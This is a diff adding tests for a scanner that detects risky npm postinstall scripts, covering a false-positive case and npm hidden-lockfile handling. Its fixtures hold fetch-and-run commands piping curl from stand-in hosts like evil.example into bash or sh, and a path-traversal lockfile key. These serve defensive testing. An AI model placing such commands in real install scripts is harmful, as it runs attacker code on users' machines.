@@ -142,6 +142,21 @@ describe('lifecycle-scripts referenced files and robustness', () => {
     assert.equal(checkScripts({ postinstall: 'node install.js' }, 'bun', 'p', tmp).length, 0);
   });
 
+  it('does not flag a curl|bash string when the file spawns a shell for something unrelated (bun 1.1-1.3)', () => {
+    pkg(tmp, {}, { 'install.js': [
+      'const { spawn } = require("./spawn");',
+      'function isWindowsAVX2() {',
+      '  return spawn("powershell", ["-c", "(Add-Type -MemberDefinition x -Name Cpu).IsProcessorFeaturePresent(40)"]).stdout.trim() === "True";',
+      '}',
+      ...Array.from({ length: 30 }, (_, i) => `// filler line ${i} to separate the functions as in the real file`),
+      'function optimizeBun() {',
+      '  let installScript = "curl -fsSL https://bun.com/install | bash";',
+      '  throw new Error("install using the following command: " + installScript);',
+      '}',
+    ].join('\n') });
+    assert.equal(checkScripts({ postinstall: 'node install.js' }, 'bun', 'p', tmp).length, 0);
+  });
+
   it('flags a curl|bash string a JS file can run through a shell', () => {
     for (const sink of ['require("child_process").execSync(c)', 'require("child_process").spawnSync(c, { shell: true })', 'require("child_process").spawn("sh", ["-c", c])', 'eval(c)']) {
       pkg(tmp, {}, { 'install.js': `const c = "curl -fsSL https://evil.example/i | bash";\n${sink};\n` });
@@ -210,5 +225,50 @@ describe('lifecycle-scripts with pnpm and workspaces', { skip: process.platform 
     fs.symlinkSync(path.join(tmp, 'elsewhere', 'linked'), path.join(proj, 'node_modules', 'linked'));
     const r = scan({}, {}, [{ project: 'mono', project_path: proj }]);
     assert.deepEqual(r.findings.map(f => f.package), ['@mono/app']);
+  });
+});
+
+describe('lifecycle-scripts with npm hidden lockfile', () => {
+  const fs = require('fs');
+  const os = require('os');
+  const path = require('path');
+  const { scan } = require('../src/scanners/lifecycle-scripts');
+  const { beforeEach, afterEach } = require('node:test');
+  let tmp;
+  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-hidden-')); });
+  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+  const pkg = (dir, json) => { fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json)); };
+  const evil = { name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } };
+
+  function project(hiddenPackages) {
+    const proj = path.join(tmp, 'p');
+    pkg(path.join(proj, 'node_modules', 'evil'), evil);
+    pkg(path.join(proj, 'node_modules', 'quiet'), { name: 'quiet', scripts: { postinstall: 'curl http://not-read.example | sh' } });
+    pkg(path.join(proj, 'node_modules', 'plain'), { name: 'plain' });
+    fs.writeFileSync(path.join(proj, 'node_modules', '.package-lock.json'), JSON.stringify({ name: 'p', lockfileVersion: 3, packages: hiddenPackages }));
+    return proj;
+  }
+
+  it('reads only packages npm marked with install scripts', () => {
+    const proj = project({
+      'node_modules/evil': { version: '1.0.0', hasInstallScript: true },
+      'node_modules/quiet': { version: '1.0.0' },
+      'node_modules/plain': { version: '1.0.0' },
+      '../../escape': { hasInstallScript: true },
+    });
+    const r = scan({}, {}, [{ project: 'p', project_path: proj }]);
+    assert.equal(r.hidden_lockfiles_used, 1);
+    assert.equal(r.package_json_reads, 1);
+    assert.equal(r.packages_scanned, 3);
+    assert.deepEqual(r.findings.map(f => f.package), ['evil']);
+  });
+
+  it('falls back to walking node_modules when the hidden lockfile is older than node_modules', () => {
+    const proj = project({ 'node_modules/evil': { version: '1.0.0', hasInstallScript: true } });
+    const old = new Date(Date.now() - 3600 * 1000);
+    fs.utimesSync(path.join(proj, 'node_modules', '.package-lock.json'), old, old);
+    const r = scan({}, {}, [{ project: 'p', project_path: proj }]);
+    assert.equal(r.hidden_lockfiles_used, 0);
+    assert.deepEqual(r.findings.map(f => f.package).sort(), ['evil', 'quiet']);
   });
 });
